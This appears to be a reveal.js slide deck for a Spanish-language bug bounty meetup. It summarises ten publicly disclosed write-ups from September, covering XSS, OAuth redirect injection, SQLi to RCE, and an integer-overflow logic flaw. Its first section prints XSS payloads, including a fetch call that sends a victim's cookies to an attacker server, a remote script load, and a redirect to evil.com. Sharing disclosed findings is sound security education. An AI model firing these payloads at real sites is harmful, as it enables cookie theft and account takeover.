---
title: 'Bug Bounty MX - Top Ten September'
theme: 'night.css'
highlightTheme: monokai
css: 'style.css'
revealOptions:
    transition: 'slide'
    controls: false
---

<!-- .slide: data-background="./img/portada.png"; data-background-opacity="0.50";-->
## Bug Bounty MX: Top Ten September 
#### xbytemx
---


<!-- .slide: style="text-align: left;" -->
### Objetivo

> Presentar las 10 publicaciones más interesantes del mes de septiembre
---


### Agenda
1. **Sep/5** *Smile Hacker* - `XSS that can pay your Bills :)`
2. **Sep/6** *Alan Brian* - `Never Give Up, The Story Behind a Dupe-To-Triaged`
3. **Sep/7** *Aditya Dixit* - `From Android Static Analysis to RCE on Prod`
4. **Sep/7** *Zohar Shachar* - `XSS->Fix->Bypass: 10000$ bounty in Google Maps`
5. **Sep/17** *Novan Aziz Ramadhan* - `My First Bug Bounty From Bug Bounty Platform redstorm.io`
----


### Agenda
6. **Sep/13** *Shrey Shah* - `SQL Injection & Remote Code Execution - Double P1`
7. **Sep/13** *Harry D* - `Business logic vulnerabilities, Low-level logic flaw`
8. **Sep/19** *Supras* - `Reflected XSS via a hidden parameter on Dutch Gov. website`
9. **Sep/26** *Daniel Marte* - `Chains on Chains: Chaining multiple low-level vulns into a Critical`
10. **Sep/27** *Vasuyadav* - `5 Ways to do Account Takeover in a Single Website`
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/5 Smile Hacker - XSS that can pay your Bills :)
---


### XSS
1. Bypassing prohibited string Inputs
2.{a}. Bypassing Document.cookie/document.domain
2.{b}. Bypassing Document.cookie/document.domain(using template string literals)
3. Redirecting user to another page
4. Sending user cookies to attacker website
5. Taking Screenshots of victim page and many more things.
---


### XSS 1
```
parent=confirm`smilehacker`
```
---


### XSS 2a
```
parent=confirm(document?.cookie) 
```
---


### XSS 2b
```
parent=confirm(this[`document`][`cookie`])
```
---


### XSS 3
```
https://www.redacted.com/path?parent=(location=`https://evil.com`)
```
---


### XSS 4
```
https://www.redacted.com/path?parent=fetch(`https://xss-server.com/path/?p=`%252bbtoa(document?.cookie))
(Works in latest browsers)
```
---


### XSS 5
```
https://www.redacted.com/path?parent=$.getScript(`//xsshunter.xss.ht`)
```
---



### Smile Hacker
> source: https://medium.com/@smilehackerofficial/xss-that-can-pay-your-bills-9377eff1fd0d
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/6 Alan Brian - Never Give Up, The Story Behind a Dupe-To-Triage
---


### Account Takeover
1. OAuth Redirect
2. XSS
---


### OAuth redirect_uri ... dup!
```
https://victim.com/auth?
client_id=&
nonce=[REDACTED]&
redirect_uri=https://www.victim.com/dashboard&
request=[TOKEN_REDACTED]&
response_type=code&
scope=openid+accounts&
state=[REDACTED]
```
---


### XSS to Account Takeover
```
https://victim.com/auth?
client_id=&
nonce=[REDACTED]&
redirect_uri=https://www.victim.com/dashboard%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&
request=[TOKEN_REDACTED]&
response_type=code&
scope=openid+accounts&
state=[REDACTED]
```
---


### Soy el Mago
> source: https://medium.com/@soyelmago/never-give-up-the-story-behind-a-dupe-to-a-triaged-43b72debb6c9
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/7 Aditya Dixit - From Android Static Analysis to RCE on Prod
---


### Information Disclosure to RCE
1. APK con strings de IPs de AWS Publicas y directorios
2. Puertos abiertos
3. Webroot listado
4. Cronjobs
5. Endpoint con IDOR y directorio reutilzado
6. Replica en produccion 
---


### dixit aditya
> source: https://blog.dixitaditya.com/from-android-app-to-rce/
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/7 zohar shachar - XSS->Fix->Bypass: 10000$ bounty in Google Maps
---


### XSS in google maps
1. KML, a XML-Like pero de mapas
2. SVG XSS dentro del KML
3. Fix de google ($5k)
4. Segundo bypass agregando mas CDATA, como cebolla
5. Fix del segundo ($5k)
---


### ehpus - zohar shachar
> source: https://www.ehpus.com/post/xss-fix-bypass-10000-bounty-in-google-maps
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/13 Shrey Shah - SQL Injection & Remote Code Execution - Double P1
---


### from SQLI to RCE
1. SQLi random en los parametros
2. Version, base de datos, usuario, tablas y esquemas
3. Filtracion de credenciales
4. Reutilizacion de credenciales en phpmyadmin sobre el mismo dominio ):
5. Escritura a disco la ejecucion de queries en phpmyadmin
6. Webshell cargada y funcionando
7. RCE y reverse shell
---


### Jerry
> source: https://medium.com/@shahjerry33/sql-injection-remote-code-execution-double-p1-6038ca88a2ec
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/13 Harry D - Business logic vulnerabilities, Low-level logic flaw
---


### 4,294,967,295 + 1 = 0. Integer overflow
1. Carro de compra solo permite 99 elementos por carga, tenemos un saldo de $100 inicial
2. Repetimos con intruder cientos de cargas de 99 objetos, hasta hacer negativa la compra (integer overflow)
3. Cargamos otro elemento (nuevamente excesivamente) para estar en un intervalo entre 0 y 100.
---


### Harry D
> source: https://medium.com/@d.harish008/business-logic-vulnerabilities-low-level-logic-flaw-f308a21a945d
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/17 Novan Aziz Ramadhan - My First Bug Bounty From Bug Bounty Platform redstorm.io
---


### Novan Aziz Ramadhan
> source: https://medium.com/@novan.rmd/my-first-bug-bounty-from-bug-bounty-platform-redstorm-io-50958f6adc90
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/19 Supras - Reflected XSS via a hidden parameter on Dutch Gov. website
---


### Supras
> source: https://supras.io/reflected-xss-via-a-hidden-parameter-on-dutch-gov-website/
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/26 Daniel Marte - Chains on Chains: Chaining multiple low-level vulns into a Critical
---


### Daniel Marte - @masonhck357
> source: https://medium.com/@masonhck357/chains-on-chains-chaining-multiple-low-level-vulns-into-a-critical-8b88db29738e
---


<!-- .slide: data-background="./img/titles.png"; -->
### Sep/27 Vasuyadav - 5 Ways to do Account Takeover in a Single Website
---


### Vasuyadav
> source: https://medium.com/@vasuyadav0786/5-ways-to-do-ato-in-a-single-website-cfe7e5da987e
---



<!-- .slide: data-background="./img/titles.png"; -->
### Playground!
---


## Muchas gracias por asistir
#### ¿Preguntas?
